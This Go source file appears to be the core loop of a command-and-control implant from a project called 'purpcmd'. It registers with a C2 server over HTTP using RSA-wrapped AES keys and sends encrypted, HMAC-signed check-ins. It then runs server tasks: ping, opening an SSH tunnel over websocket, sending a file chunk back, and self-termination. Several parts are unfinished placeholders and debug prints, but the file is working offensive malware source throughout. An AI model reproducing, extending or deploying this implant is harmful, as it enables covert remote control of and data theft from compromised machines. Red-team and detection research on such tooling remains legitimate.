package core

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"os"
	"purpcmd/implant/ssh"
	"purpcmd/internal"
	"purpcmd/internal/encrypt"
	"time"
)

func Start() {
	i := ImplantInit()

	h := HTTPNew(i.SessionID)
	h.HTTPSetSocket("0.0.0.0:4444")
	h.HTTPSetURL(false, "/")

	enc := encrypt.EncryptInit()
	key, iv := enc.EncryptGetKeys()

	r := PackRegistration(i, key, iv)
	aux, err := enc.RSAEncode(r)
	if err != nil {
		println(err.Error())
		return
	}

	fmt.Println("key", base64.StdEncoding.EncodeToString(key[:]), "iv", base64.StdEncoding.EncodeToString(iv[:]))

	p := base64.StdEncoding.EncodeToString(aux)
	println(p)
	h.PostRegistering([]byte(p))

	for {
		data := PackCheck(i)
		dataEnc := enc.AESCbcEncrypt(data)

		enc.HMACPackAddHmac(&dataEnc)
		dataP := base64.StdEncoding.EncodeToString(dataEnc)

		println("sent check:",dataP)
		resp, err := h.Get([]byte(dataP))
		if err != nil {
			println(err.Error())
		}
		
		xyz,_ := io.ReadAll(resp)
		fmt.Println("Data received ", len(xyz))
		if len(xyz) < 16 {
			time.Sleep(time.Duration(i.Sleep) * time.Second)
			continue
		}
		dataB64 := make([]byte, base64.StdEncoding.DecodedLen(len(xyz)))
		n, _ := base64.StdEncoding.Decode(dataB64, xyz)

		if !enc.HMACVerifyHash(dataB64[:n]) {
			fmt.Println("data not verified properly")
			return
		}
		dataOrig := dataB64[:n][:len(dataB64[:n])-16]
		xyzDecry, err := enc.AESCbcDecrypt(dataOrig)
		if err != nil {
			println(err.Error())
			return
		}

		tid, tcode, payload := PackParseTask(bytes.NewReader(xyzDecry))

		print("->",tcode)
		switch tcode {
		case internal.PING:
			println("\n->",tcode)
			responseTaskPayload := string(payload) + " pong"
			taskResp := PackResponse(i, []byte(responseTaskPayload), tid)

			dataEnc := enc.AESCbcEncrypt(taskResp)
			enc.HMACPackAddHmac(&dataEnc)
			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
			println(taskRestEnc)
			h.Post([]byte(taskRestEnc))
		case internal.SSH:
			print("->",tcode, "calling ssh for ", h.Socket)
			ssh.Wsclient("aaa","/any.png" , h.Socket)
		case internal.DOWN:
			println("\n->",tcode)
			taskResp := PackChunk(i, "any.txt", []byte("aaa"), tid)

			dataEnc := enc.AESCbcEncrypt(taskResp)
			enc.HMACPackAddHmac(&dataEnc)
			taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
			println(taskRestEnc)
			h.Post([]byte(taskRestEnc))
		case internal.KILL:
			println("\n->",tcode)
			os.Exit(0)
		default:
			print("->",tcode, "Nothing")
		}

		time.Sleep(time.Duration(i.Sleep) * time.Second)
	}
}